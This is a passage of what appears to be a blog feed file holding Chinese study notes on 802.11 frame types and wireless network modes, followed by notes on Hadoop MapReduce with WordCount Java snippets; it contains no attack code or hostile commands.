<li><p>每个单播帧需要ACK立刻确认（组播和组播不需要ack确认</p>
</li>
<li><p>尽快响应（由硬件完成，而非驱动层</p>
</li>
<li><p>type为1，subtype为13</p>
</li>
<li><p>包结构：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/60637569.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
<h3 id="PS-Poll"><a href="#PS-Poll" class="headerlink" title="PS-Poll"></a>PS-Poll</h3><ul>
<li><p>简介：</p>
<ul>
<li><p>PS-poll，即power save power</p>
</li>
<li><p>作用：向AP请求缓存中的数据帧</p>
</li>
<li><p>包结构：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/69609263.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
<ul>
<li>此时AID取代了Duration/ID</li>
<li>AID：关联ID，AID-Association ID</li>
<li>BSSID：STA正关联的AP地址</li>
<li>TA：发送此帧的STA地址，transmitter address（可以理解为源地址，实际是负责中转的AP地址</li>
</ul>
</li>
</ul>
</li>
<li><p>RF系统的放大器</p>
<ul>
<li>主要耗电的组件</li>
<li>发射前放大信号，接收并放大还原信号</li>
</ul>
</li>
<li><p>省电模式</p>
<ul>
<li>关闭信号发射器节省电源耗电（并不是完全关闭，几乎完全关闭</li>
</ul>
</li>
<li><p>STA省电模式唤醒</p>
<ul>
<li><p>数据发送至AP（AP缓存数据包</p>
</li>
<li><p>AP通过beacon发送TIM</p>
<ul>
<li>TAC即traffic indication map；</li>
<li>其中包含AID；</li>
<li>通知STA有发送给他的数据包</li>
</ul>
</li>
<li><p>STA对比AID后唤醒网卡，从省电模式转换为活动模式</p>
</li>
<li><p>STA发送PS-poll帧，请求从AP缓存中取回数据</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/27959271.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
<ul>
<li>每个帧都需要ACK确认</li>
<li>ACK确认后AP从缓存中删除数据帧</li>
<li>传输过程中STA保持唤醒状态</li>
<li>传输结束后STA恢复省电状态</li>
</ul>
</li>
</ul>
</li>
<li><p>AP接收ps-poll帧</p>
<ul>
<li>立刻响应</li>
<li>延迟响应（简单响应帧，表STA正在忙，稍候</li>
</ul>
</li>
</ul>
<h3 id="RTS-CTS"><a href="#RTS-CTS" class="headerlink" title="RTS/CTS"></a>RTS/CTS</h3><ul>
<li><p>是CSMA/CA方法的一种补充手段</p>
<ul>
<li>降低冲突产生的可能性</li>
<li>正式通信之前通过请求应答机制，确认通信介质的可用性</li>
<li>并锁定传输介质和预约通信时间（拒绝第三方的请求）</li>
<li>只有在传输长帧时使用，传输短帧时不会使用<ul>
<li>驱动接口提供阀值的自定义（代码中声明，长短帧的一个界线）</li>
<li>大于阀值的帧被视为长帧，反之则视为短帧</li>
</ul>
</li>
</ul>
</li>
<li><p>简单过程：</p>
<ul>
<li><p>Node1发送request to send 包给node2</p>
</li>
<li><p>如果未发生冲突，且node2处于空闲状态，则node2返回clear to send给node1</p>
</li>
<li><p>node1得到确认，随后开始传输数据</p>
</li>
<li><p>数据正常接收，node2返回ack，否则node1什么也收不到</p>
</li>
<li><p>整个一个传输过程，称为一个原子周期（RTS和CTS只是一部分</p>
</li>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/5211342.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
</li>
<li><p>网络介质访问方法：</p>
<ul>
<li>有线网络介质访问方法：CSMA/CD</li>
<li>无限网络介质访问方法：CSMA/CA</li>
</ul>
</li>
<li><p>与CSMA/CA比较</p>
<ul>
<li>可以避免隐藏节点的出现<ul>
<li>node1与node2通信，但在node1范围之外还有一个node3，其也要与node2通信，对于node1，node3即为他的隐藏节点</li>
<li>若只采用CSMA/CA，node2上会跑一个算法，对接受谁的连接做一个选择，消耗资源</li>
<li>而RTS/CTS的请求应答机制，便很好的解决了这个问题</li>
</ul>
</li>
</ul>
</li>
<li><p>RTS帧长度20字节</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/57842724.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
<li><p>CTS帧长度14字节</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/33079228.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
<h2 id="management-frame：管理帧"><a href="#management-frame：管理帧" class="headerlink" title="management frame：管理帧"></a>management frame：管理帧</h2><ul>
<li><p>用于协商和控制STA与AP之间的关系</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/85093775.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
<ul>
<li>0/1，关联请求/响应：STA请求连接AP时</li>
<li>2/3，重新关联请求/响应：一段时间后，STA不活动，AP误以为STA处于离线状态，STA需要重新请求</li>
<li>4/5，探测请求/响应：STA探测一个范围内AP，若存在以前连接过的，则连接，没有的话也会起到一个发现AP的作用</li>
<li>11/12，即认证（家庭中是共享方式，只知道密码即可，而企业中多会采用用户名+密码的形式</li>
</ul>
</li>
</ul>
<h3 id="Beacon-frame"><a href="#Beacon-frame" class="headerlink" title="Beacon frame"></a>Beacon frame</h3><ul>
<li><p>功能：AP发送的广播帧，通告无线网络的存在（BSSID</p>
</li>
<li><p>发包频率</p>
<ul>
<li>102.4ms发送一个帧（可变</li>
<li>无线的时间单位：1024 microseconds（1024微秒即1.024毫秒</li>
<li>大约一秒发送10个Beacon帧</li>
</ul>
</li>
<li><p>SSID网络名</p>
<ul>
<li>可以隐藏AP不发SSID广播，达到隐藏AP的作用</li>
<li>客户端如果要连接，只能够手动配置</li>
</ul>
</li>
<li><p>图示：（不是所有的字段都会存在）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/26030361.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
<ul>
<li>timestamp：时间戳</li>
<li>Beacon interval：多久发送一个帧</li>
<li>capability information<ul>
<li>IBSSI status<ul>
<li>0:infrastructure</li>
<li>1: ad-hoc</li>
</ul>
</li>
<li>privacy：<ul>
<li>加密相关，如WEP、WPA</li>
<li>不管何种加密，此位都会置于1（若是WPA加密，则在数据包后面还有扩展信息，而WEP是没有的</li>
</ul>
</li>
</ul>
</li>
<li>tagged parameters（各种标签参数）<ul>
<li>上述capability information后面的字段一般是存在于此的</li>
<li>不会出现所有的tag，有用的才出现在Beacon帧中</li>
<li>tag：SSID<ul>
<li>显示SSID的名称和长度</li>
<li>若为安全，隐藏AP广播，那么在此SSID的名称就是空白的</li>
<li>但是可以根据长度（长度是隐藏不了的），来判断是有一个隐藏AP的存在的，若为7，则存在一个名称长度为7的AP的存在</li>
</ul>
</li>
<li>tag：supported rates<ul>
<li>支持的速率</li>
<li>通过速率可以判断此AP是工作在哪种802.11标准下，a/b/n/g等</li>
<li>如，802.11 g（1-54Mbit），802.11b（1-11Mbit），由此也可见，g是向下兼容b的</li>
</ul>
</li>
<li>tag：DS parameter set<ul>
<li>current channel，当前的信道，如信道11，不同的信道占用不同的频谱和带宽</li>
</ul>
</li>
<li>tag：Traffic Indication Map（TIM）<ul>
<li>STA处于省电模式下，AP发送TIM用来通知STA有数据发送给他，唤醒STA</li>
</ul>
</li>
</ul>
</li>
<li>不同厂商，其发送的Beacon也可能是不一样的</li>
</ul>
</li>
</ul>
<h3 id="Probe-request-response-frames"><a href="#Probe-request-response-frames" class="headerlink" title="Probe request/response frames"></a>Probe request/response frames</h3><p>request：</p>
<ul>
<li><p>功能：STA发出的，用于STA扫描现有AP</p>
<ul>
<li>发现连接过的AP（非广播，有针对性，看一下曾经连接过的AP在不在此范围内）</li>
<li>发现未连接的AP（通过广播，询问此范围内有哪些AP）</li>
</ul>
</li>
<li><p>结构图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/25690746.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
<p>response</p>
<ul>
<li><p>STA在发现连接过的AP时，曾经连接过的AP会响应</p>
<ul>
<li><p>AP从接收到的request中发现速率和ESSID与自己相同的，则会响应（两者要同时满足相同）</p>
</li>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/84811713.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h3 id="Authentication-frame"><a href="#Authentication-frame" class="headerlink" title="Authentication frame"></a>Authentication frame</h3><ul>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/51975945.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
<li><p>authentication algorithm身份认证类型</p>
<ul>
<li>0开放系统身份验证（即不需要账号密码的）</li>
<li>1共享密钥身份验证（家用路由器）</li>
</ul>
</li>
<li>身份认证有多个帧交换过程组成</li>
<li>authentication seq<ul>
<li>每次身份验证过程seq唯一</li>
<li>1-65535</li>
</ul>
</li>
<li>challenge text<ul>
<li>是变长的</li>
<li>只有共享密钥方式才有此字段</li>
</ul>
</li>
<li>status code：成功/失败</li>
</ul>
<h3 id="association-reassociation-frames"><a href="#association-reassociation-frames" class="headerlink" title="association/reassociation frames"></a>association/reassociation frames</h3><ul>
<li><p>身份验证成功后，STA执行关联操作，加入无线网络</p>
<ul>
<li><p>association request</p>
<ul>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/47841635.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
<li></li>
</ul>
</li>
<li><p>Reassociation request</p>
<ul>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/64948575.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
</li>
<li><p>association response</p>
<ul>
<li><p>AP对STA的关联请求的响应</p>
</li>
<li><p>状态码：关联成功/失败</p>
</li>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/31599738.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="disassociation-deauthentication"><a href="#disassociation-deauthentication" class="headerlink" title="disassociation/deauthentication"></a>disassociation/deauthentication</h3><ul>
<li><p>解除关联或者解除身份认证</p>
</li>
<li><p>由AP发出（2个字节</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/11916228.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
<li><p>原因</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/19658392.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
<ul>
<li></li>
</ul>
</li>
</ul>
<h3 id="atim-frames"><a href="#atim-frames" class="headerlink" title="atim frames"></a>atim frames</h3><ul>
<li><p>只有在ad-hoc网络下使用（不常见）</p>
</li>
<li><p>sta使用此帧通知接收者其有缓存的数据要发送</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/76384957.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
<h2 id="data-frame：数据帧"><a href="#data-frame：数据帧" class="headerlink" title="data frame：数据帧"></a>data frame：数据帧</h2><ul>
<li><p>图示（许多是性能相关的，只关注安全相关的即可）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/27643484.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
</ul>
<h3 id="data-frame"><a href="#data-frame" class="headerlink" title="data frame"></a>data frame</h3><ul>
<li>传输用户数据</li>
</ul>
<h3 id="null-data-frame"><a href="#null-data-frame" class="headerlink" title="null data frame"></a>null data frame</h3><ul>
<li>空数据帧</li>
<li>只包含MAC头和FCS</li>
<li>用处：STA用于声明自己将要进入省电模式</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
        <tag>802.11</tag>
      </tags>
  </entry>
  <entry>
    <title>无线网络运行模式</title>
    <url>/2018/02/18/wireless/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="无线网络运行模式"><a href="#无线网络运行模式" class="headerlink" title="无线网络运行模式"></a>无线网络运行模式</h1><h2 id="也称无线网络架构，有两种"><a href="#也称无线网络架构，有两种" class="headerlink" title="也称无线网络架构，有两种"></a>也称无线网络架构，有两种</h2><ul>
<li>infrastructure：AP维护SSID</li>
<li>Ad-Hoc：STA维护SSID</li>
</ul>
<h2 id="SSID"><a href="#SSID" class="headerlink" title="SSID"></a>SSID</h2><ul>
<li>服务集标识符，即网络名称</li>
<li>每一个基础架构网络都需要一个SSID<a id="more"></a></li>
<li>AP每秒钟约10次通过Beacon帧广播SSID</li>
<li>客户端连接到无线网络后也会宣告SSID<ul>
<li>一般情况，可以通过AP的广播发现SSID，即发现网络</li>
<li>从安全方面考虑，会限制AP广播SSID，以隐藏网络</li>
<li>但是仍可以通过客户端的宣告来发现（不会每10秒这样频繁</li>
</ul>
</li>
</ul>
<h2 id="infrastructure"><a href="#infrastructure" class="headerlink" title="infrastructure"></a>infrastructure</h2><ul>
<li>简介<ul>
<li>基础架构型的</li>
<li>AP维护SSID</li>
<li>最常见的，家用的路由器便是AP，SSID，即服务集标识符，俗称网络名</li>
<li>AP加上各种连入网络的设备，便组成了infrastructure</li>
<li>若多个设备连入一个AP，则设备间通信是通过AP的</li>
</ul>
</li>
<li>基本和扩展服务集<ul>
<li>至少包含一个AP和一个STATION（即连入的设备），形成一个基本服务集BSS</li>
<li>AP连接到有线网络，成为distribute system，即DS（多个AP同时连到一跟网线，一起组成DS</li>
<li>连接到同一个DS的多个AP形成一个扩展服务集ESS</li>
<li>存在BSSID和ESSID<ul>
<li>BSSID是AP的mac地址，真实的而非逻辑</li>
<li>ESSID是一个逻辑的而非实际的，用于标示网络</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="AD-HOC"><a href="#AD-HOC" class="headerlink" title="AD-HOC"></a>AD-HOC</h2><ul>
<li>STA维护SSID</li>
<li>没有AP，且必须没有AP</li>
<li>也被称为IBSS，即独立的基本服务集</li>
<li>有至少两个STA直接通信组成（也称为peer to peer模式，即不经过ap，两设备直接通信，不同于infrastructure需要经由AP</li>
<li>其中一个STA负责AP的工作<ul>
<li>定义SSID，并通过beacon广播SSID</li>
<li>对其他STA进行身份验证</li>
</ul>
</li>
</ul>
<h2 id="WDS"><a href="#WDS" class="headerlink" title="WDS"></a>WDS</h2><ul>
<li>wireless distribute system，无线分布系统</li>
<li>与有线DS类似，只是通过无线连接的多个AP组成的网络（多个AP连入一个无线总AP，一起组成WDS</li>
<li>可很好的避免布线混乱，网线-AP总-AP1-AP2，ap2的设备通过此路线可与外网通信（一楼的网线和AP总，二楼的AP2及其连入设备，三楼…</li>
<li>两种模式<ul>
<li>bridging，网桥模式<ul>
<li>只有AP间彼此通信</li>
<li>手机1连入ap1，手机2连接AP2，路线只能是手机1-AP1-手机1-AP2</li>
</ul>
</li>
<li>repeating，中继方式<ul>
<li>允许所有AP和STA进行通信</li>
<li>手机1也可以与AP2通信，即若手机1也在AP2的范围内，则与手机2通信时，可直接手机1-AP2-手机2</li>
<li>不用经过AP1，但是还是要经过AP2的，不是AD-HOCX下的sta间直接通信</li>
</ul>
</li>
</ul>
</li>
<li>多个ap连接至同一个无线总AP上，形成一个WDS<ul>
<li>子AP间各自拥有BSS</li>
<li>这些子AP间的BSS，也组成一个ESS</li>
</ul>
</li>
</ul>
<h2 id="monitor-mode"><a href="#monitor-mode" class="headerlink" title="monitor mode"></a>monitor mode</h2><ul>
<li>monitor不是一种真的无线模式（严格来讲 不算一种模式</li>
<li>对无线渗透非常重要</li>
<li>允许无线网卡没有任何筛选的抓包（目的是抓：802.11包头<ul>
<li>802.11的数据包是通过无线网卡传输的</li>
<li>但用一些工具在无线网卡抓包时是看不到802.11的包的</li>
<li>因为网卡在默认情况下（网卡处于managed模式，而非monitor），抓包时802.11 包头都是被过滤的</li>
<li>若想抓到，则要置于monitor模式</li>
</ul>
</li>
<li>可以类比于有线网络的混杂模式（网卡置于混杂模式可以抓其它机器的流量，不限于本机网卡，是用来抓包的</li>
<li>适合的网卡和驱动，不仅可以monitor，甚至可以injection</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据学习04_mapreduce</title>
    <url>/2018/01/28/etc/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A004-mapreduce/</url>
    <content><![CDATA[<h1 id="01-简介"><a href="#01-简介" class="headerlink" title="01-简介"></a>01-简介</h1><h2 id="1-1-mr是什么"><a href="#1-1-mr是什么" class="headerlink" title="1.1-mr是什么"></a>1.1-mr是什么</h2><ul>
<li>是什么<ul>
<li>MapReduce是一个编程模型，用以进行大数据量的计算</li>
<li>Hadoop MapReduce是一个软件框架，基于该框架能够容易地编写应用程序，这些应用程序能够运行在由上千个商用机器组成的大集群上，并以一种可靠的，具有容错能力的方式并行地处理上TB级别的海量数据集</li>
</ul>
</li>
<li>特点<ul>
<li>软件框架</li>
<li>并行处理</li>
<li>可靠且容错</li>
<li>大规模集群</li>
<li>海量数据集</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h2 id="1-2-mr做什么"><a href="#1-2-mr做什么" class="headerlink" title="1.2-mr做什么"></a>1.2-mr做什么</h2><ul>
<li>MapReduce的思想就是“分而治之”</li>
<li>Mapper负责“分”<ul>
<li>把复杂的任务分解为若干个“简单的任务”来处理。</li>
<li>简单的任务”包含三层含义：<ul>
<li>数据或计算的规模相对原任务要大大缩小</li>
<li>就近计算原则，任务会分配到存放着所需数据的节点上进行计算</li>
<li>这些小任务可以并行计算彼此间几乎没有依赖关系</li>
</ul>
</li>
</ul>
</li>
<li>Reducer负责对map阶段的结果进行汇总<ul>
<li>需要多少个reducer，具体情况具体分析</li>
<li>在mapred-site.xml配置文件里设置参数mapred.reduce.tasks的值，缺省值为1</li>
</ul>
</li>
</ul>
<ul>
<li><ol>
<li><ul>
<li></li>
</ul>
</li>
</ol>
</li>
</ul>
<h1 id="02-mr框架执行过程"><a href="#02-mr框架执行过程" class="headerlink" title="02-mr框架执行过程"></a>02-mr框架执行过程</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1-简介"></a>2.1-简介</h2><ul>
<li>在Hadoop中，一个MapReduce作业会把输入的数据集切分为若干独立的数据块，由Map任务以完全并行的方式处理</li>
<li>框架会对Map的输出先进行排序，然后把结果输入给Reduce任务。</li>
<li>作业的输入和输出都会被存储在文件系统中，整个框架负责任务的调度和监控，以及重新执行已经关闭的任务</li>
<li>MapReduce框架和分布式文件系统是运行在一组相同的节点，计算节点和存储节点都是在一起的</li>
</ul>
<h2 id="2-2-mr框架的组成"><a href="#2-2-mr框架的组成" class="headerlink" title="2.2-mr框架的组成"></a>2.2-mr框架的组成</h2><ul>
<li>客户端client<ul>
<li>编写mapreduce程序</li>
<li>配置作业，提交作业</li>
</ul>
</li>
<li>JobTracker<ul>
<li>初始化作业并分配作业</li>
<li>与TaskTcacker双向通信</li>
<li>协调整个作业的执行</li>
</ul>
</li>
<li>TaskTracker<ul>
<li>接收到分配的作业后，执行Map或Reduce任务</li>
<li>保持与JobTracker的通信（涉及：心跳机制监控）</li>
<li>执行任务时候TaskTracker可以有n个，JobTracker则只会有一个（JobTracker只能有一个就和hdfs里namenode一样，存在单点故障）</li>
</ul>
</li>
<li>HDFS<ul>
<li>在其它实体间共享作业文件</li>
<li>保存作业的数据、配置信息等等，最后的结果也是保存在hdfs上面</li>
</ul>
</li>
</ul>
<h2 id="2-3-简单工作流程"><a href="#2-3-简单工作流程" class="headerlink" title="2.3-简单工作流程"></a>2.3-简单工作流程</h2><ol>
<li>作业的提交</li>
<li>作业的初始化</li>
<li>作业的分配</li>
<li>作业的执行</li>
<li>进程与状态的更新</li>
<li>作业的完成</li>
</ol>
<h2 id="2-4-简要运行步骤"><a href="#2-4-简要运行步骤" class="headerlink" title="2.4-简要运行步骤"></a>2.4-简要运行步骤</h2><ol>
<li><p><strong>客户端</strong>编写mapreduce程序（即理解为job），提交job到JobTracker</p>
</li>
<li><p><strong>JobTracker</strong>构建此job（分配job ID值）</p>
</li>
<li><p><strong>JobTracker</strong> 做相关的检查操作</p>
<ul>
<li>输出目录是否存在（若存在，JobTraker抛出错误给客户端；反之继续</li>
<li>输入目录是否存在（不存在，抛出错误；反之继续</li>
</ul>
</li>
<li><p><strong>JobTracker</strong>根据输入计算输入分片，即input split（分片计算不出来也抛错</p>
</li>
<li><p><strong>JobTracker</strong>为job配置其需要的资源</p>
</li>
<li><p><strong>JobTracker</strong>初始化该job</p>
<ul>
<li>将job放入内部队列，以便能够被作业调度器调度到</li>
<li>作业调度器初始化此job，即创建job对象，以便JobTracker跟踪job的状态和进程</li>
</ul>
</li>
<li><p><strong>JobTracker</strong>，作业调度器会获取输入分片（input split）的信息，为每个分片创建map任务</p>
</li>
<li><p>JobTracker分配任务至TaskTracker</p>
<p>此时TT会运行简单的循环机制定期发送心跳给jobtracker</p>
<ul>
<li>心跳间隔是5秒，可自行配置这个时间</li>
<li>心跳就是jobtracker和tasktracker沟通的桥梁<ul>
<li>通过心跳，jobtracker可以监控tasktracker是否存活</li>
<li>也可以获取tasktracker处理的状态和问题</li>
<li>同时tasktracker也可以通过心跳里的返回值获取jobtracker给它的操作指令。</li>
</ul>
</li>
</ul>
</li>
<li><p>任务分配后便就是执行任务了</p>
<ul>
<li>任务执行时候jobtracker可以通过心跳机制监控tasktracker的状态和进度</li>
<li>同时也能计算出整个job的状态和进度</li>
<li>而tasktracker也可以本地监控自己的状态和进度</li>
</ul>
</li>
<li><p>任务执行完成</p>
<ul>
<li>当jobtracker获得了最后一个完成指定任务的tasktracker操作成功的通知时候，jobtracker会把整个job状态置为成功</li>
<li>当客户端查询job运行状态时候（注意：这个是异步操作），客户端会查到job完成的通知的。</li>
<li>如果job中途失败，mapreduce也会有相应机制处理，一般而言如果不是程序员程序本身有bug，mapreduce错误处理机制都能保证提交的job能正常完成。</li>
</ul>
</li>
</ol>
<h2 id="2-5-mr的输入输出"><a href="#2-5-mr的输入输出" class="headerlink" title="2.5-mr的输入输出"></a>2.5-mr的输入输出</h2><ul>
<li><p>有三组<code>&lt;key,value&gt;</code>键值对类型的存在</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-28/3278474.jpg" alt></p>
</li>
</ul>
<h2 id="2-6-mr作业的处理流程"><a href="#2-6-mr作业的处理流程" class="headerlink" title="2.6-mr作业的处理流程"></a>2.6-mr作业的处理流程</h2><ul>
<li><p>按照时间顺序包括：</p>
<ul>
<li>输入分片（input split）</li>
<li>map阶段</li>
<li>combiner阶段</li>
<li>shuffle阶段</li>
<li>reduce阶段</li>
</ul>
</li>
<li><p>输入分片（input split）</p>
<ul>
<li>在进行map计算之前，mapreduce会根据输入文件计算输入分片（input split）</li>
<li>每个输入分片（input split）针对一个map任务</li>
<li>输入分片（input split）存储的并非数据本身，而是一个分片长度和一个记录数据位置的数组</li>
<li>输入分片（input split）往往和hdfs的block（块）关系很密切</li>
<li>假如我们设定hdfs的块的大小是64mb，如果我们输入有三个文件，大小分别是3mb、65mb和127mb，那么mapreduce会把3mb文件分为一个输入分片（input split），65mb则是两个输入分片（input split）而127mb也是两个输入分片（input split）</li>
<li>即我们如果在map计算前做输入分片调整，例如合并小文件，那么就会有5个map任务将执行，而且每个map执行的数据大小不均，这个也是mapreduce优化计算的一个关键点。</li>
</ul>
</li>
<li><p>map阶段</p>
<ul>
<li>map函数在客户端编写</li>
<li>好的map函数了，因此map函数效率相对好控制，而且一般map操作都是本地化操作也就是在数据存储节点上进行</li>
</ul>
</li>
<li><p>combiner阶段</p>
<ul>
<li><p>combiner阶段是程序员可以选择的，combiner其实也是一种reduce操作，因此我们看见WordCount类里是用reduce进行加载的</p>
</li>
<li><p>Combiner是一个本地化的reduce操作，它是map运算的后续操作，主要是在map计算出中间文件前做一个简单的合并重复key值的操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Combiner是一个本地化的reduce操作，它是map运算的后续操作，主要是在map计算出中间文件前做一个简单的合并重复key值的操作，例如我们对文件里的单词频率做统计，map计算时候如果碰到一个hadoop的单词就会记录为1，但是这篇文章里hadoop可能会出现n多次，那么map输出文件冗余就会很多，因此在reduce计算前对相同的key做一个合并操作，那么文件会变小，这样就提高了宽带的传输效率，毕竟hadoop计算力宽带资源往往是计算的瓶颈也是最为宝贵的资源，但是combiner操作是有风险的，使用它的原则是combiner的输入不会影响到reduce计算的最终输入，</span><br></pre></td></tr></table></figure>
</li>
<li><p>但是combiner操作是有风险的，使用它的原则是combiner的输入不会影响到reduce计算的最终输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：如果计算只是求总数，最大值，最小值可以使用combiner，但是做平均值计算使用combiner的话，最终的reduce计算结果就会出错</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>shuffle阶段</p>
<ul>
<li>将map的输出作为reduce的输入的过程就是shuffle了</li>
<li>reduce阶段<ul>
<li>和map函数一样也是程序员编写的</li>
<li>最终结果是存储在hdfs上的</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2-7-其它：jobtracker的单点故障"><a href="#2-7-其它：jobtracker的单点故障" class="headerlink" title="2.7-其它：jobtracker的单点故障"></a>2.7-其它：jobtracker的单点故障</h2><ul>
<li>jobtracker和hdfs的namenode一样也存在单点故障</li>
<li>单点故障一直是hadoop被人诟病的大问题</li>
<li>为什么hadoop的做的文件系统和mapreduce计算框架都是高容错的，但是最重要的管理节点的故障机制却如此不好<ul>
<li>主要是namenode和jobtracker在实际运行中都是在内存操作，而做到内存的容错就比较复杂了，只有当内存数据被持久化后容错才好做</li>
<li>namenode和jobtracker都可以备份自己持久化的文件，但是这个持久化都会有延迟，因此真的出故障，任然不能整体恢复</li>
</ul>
</li>
<li>另外hadoop框架里包含zookeeper框架，zookeeper可以结合jobtracker，用几台机器同时部署jobtracker，保证一台出故障，有一台马上能补充上，不过这种方式也没法恢复正在跑的mapreduce任务。</li>
</ul>
<h1 id="03-wordcount源码解读"><a href="#03-wordcount源码解读" class="headerlink" title="03-wordcount源码解读"></a>03-wordcount源码解读</h1><h2 id="3-1-map方法"><a href="#3-1-map方法" class="headerlink" title="3.1-map方法"></a>3.1-map方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(Object key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;…&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前两个参数Object key, Text value就是输入的key和value，</li>
<li>第三个参数Context context这是可以记录输入的key和value<ul>
<li>例如：context.write(word, one);</li>
<li>此外context还会记录map运算的状态。</li>
</ul>
</li>
</ul>
<h2 id="3-2-reduce方法"><a href="#3-2-reduce方法" class="headerlink" title="3.2-reduce方法"></a>3.2-reduce方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;…&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>reduce函数的输入也是一个key/value的形式</li>
<li>不过它的value是一个迭代器的形式Iterable<intwritable> values</intwritable></li>
<li>也就是说reduce的输入是一个key对应一组的值的value</li>
<li>reduce也有context和map的context作用一致</li>
</ul>
<h2 id="3-3-main函数"><a href="#3-3-main函数" class="headerlink" title="3.3-main函数"></a>3.3-main函数</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">    String[] otherArgs = <span class="keyword">new</span> GenericOptionsParser(conf, args).getRemainingArgs();</span><br><span class="line">    <span class="keyword">if</span> (otherArgs.length != <span class="number">2</span>) &#123;</span><br><span class="line">      System.err.println(<span class="string">"Usage: wordcount &lt;in&gt; &lt;out&gt;"</span>);</span><br><span class="line">      System.exit(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Job job = <span class="keyword">new</span> Job(conf, <span class="string">"word count"</span>);</span><br><span class="line">    job.setJarByClass(WordCount.class);</span><br><span class="line">    job.setMapperClass(TokenizerMapper.class);</span><br><span class="line">    job.setCombinerClass(IntSumReducer.class);</span><br><span class="line">    job.setReducerClass(IntSumReducer.class);</span><br><span class="line">    job.setOutputKeyClass(Text.class);</span><br><span class="line">    job.setOutputValueClass(IntWritable.class);</span><br><span class="line">    FileInputFormat.addInputPath(job, <span class="keyword">new</span> Path(otherArgs[<span class="number">0</span>]));</span><br><span class="line">    FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(otherArgs[<span class="number">1</span>]));</span><br><span class="line">    System.exit(job.waitForCompletion(<span class="keyword">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>代码-01：</p>
